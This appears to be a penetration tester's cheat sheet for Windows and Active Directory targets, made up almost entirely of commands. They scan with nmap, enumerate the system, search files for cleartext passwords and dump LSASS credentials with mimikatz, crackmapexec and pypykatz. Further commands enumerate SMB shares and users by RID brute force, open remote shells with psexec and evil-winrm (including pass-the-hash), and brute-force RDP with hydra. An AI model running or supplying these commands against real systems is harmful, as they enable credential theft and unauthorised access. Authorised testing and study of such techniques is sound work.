Port scan for Win:

```bash
nmap -sC -sV -A -Pn -p 53,88,135,139,445 $TARGET_IP -vv
```

Check OS architecture / version:
```powershell
ver
wmic os get osarchitecture
hostname
systeminfo | findstr /B /C:"OS Name" /C:"OS Version" /C:"System Type"
```

Get OS patches:
```powershell
wmic qfe get Caption,Description,HotFixID,InstalledOn
```

Get OS drives:
```powershell
wmic logicaldisk get caption,description,providername
```
Get network adapters and open ports:
```powershell
ipconfig /all
netstat -ano
```

Get routes:
```powershell
route PRINT
```

Get running processes:

```powershell
tasklist /SVC
```

Get installed patches:

```powershell
wmic qfe
```

Search for cleartext passwords:
```powershell
findstr /si password *.txt
findstr /spin "password" *.*
```

Dump LSASS:
check for #SEDebugPrivilige
```powershell
whoami /priv
#run mimikatz
```

```bash
crackmapexec smb $TARGET_IP -u $USER -p $PASSWORD -M minidump
pypykatz lsa minidump lsass.DMP
```

Add domain NB name to /etc/hosts

```bash
crackmapexec smb $TARGET_IP -u '' -p ''
```

check for open shares

```bash
crackmapexec smb $TARGET_IP -u '' -p '' --shares
```

Enumerate users by brute forcing RID
#rid #bruteforce-rid

```shell
crackmapexec smb $AD_DOMAIN -u $USER -p '' --rid-brute 10000
#extract usernames
crackmapexec smb $AD_DOMAIN -u $USER -p '' --rid-brute 10000 | grep -o '\\[^ ]*' | awk -F'\\' '{print $2}' | uniq
```

Show all files and DIRs for guest:

```shell
crackmapexec smb $TARGET_IP -u 'guest' -p '' -M spider_plus
```

```shell
crackmapexec smb $TARGET_IP -u $USER -p $PASSWORD -M spider_plus --spider users
```

Parse the JSON from the previous cmd into readable form:

```shell
cat $TARGET_IP.json | jq '. |map_values(keys)'
```

Mount windows share:
```bash
sudo mount -o username=$USER,password=$PASSWORD -t cifs \\\\$TARGET_IP\$SHARE /mnt
```

Try to connect to console:

```shell
impacket-psexec $USER:$PASSWORD@$TARGET_IP
```

```shell
evil-winrm -i $TARGET_IP -u administrator -p $PASSWORD
```

```shell
evil-winrm -i $TARGET_IP -u administrator -H $HASH
```

```sh
crackmapexec winrm $TARGET_IP -u $USER -p $PASSWORD
```


Port 3389 RDP:

```bash
xfreerdp /v:$TARGET_IP /u:$USER
```

Connect with shared folder, and NLA :
```bash
xfreerdp /v:$TARGET_IP /sec:nla /u:$USER /p:$PASSWORD /drive:shared,/home/kali/shared
```

Brute force RDP:

```bash
hydra -L /usr/share/wordlists/dirb/others/names.txt -p $PASSWORD rdp://$TARGET_IP -I
```